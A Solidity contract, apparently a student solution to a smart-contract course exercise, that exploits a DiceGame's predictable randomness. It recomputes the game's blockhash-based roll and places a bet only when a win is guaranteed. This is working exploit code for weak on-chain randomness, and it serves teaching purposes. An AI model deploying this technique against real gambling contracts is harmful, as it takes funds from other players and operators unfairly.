pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.

    // Include the `receive()` function to enable the contract to receive incoming Ether.

    receive() external payable {}

    function riggedRoll() public onlyOwner {
        require(address(this).balance >= 0.002 ether, "Not enough ETH to roll");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("\t", "   Rigged Roll Prediction:", roll);

        require(roll <= 5, "Predicting a loss, transaction reverted to save ETH");

        diceGame.rollTheDice{value: 0.002 ether}();
    }

    function withdraw(address payable _to, uint256 _amount) public onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No Ether to withdraw");
        (bool success, ) = _to.call{value: _amount}("");
        require(success, "Withdrawal failed");
    }
}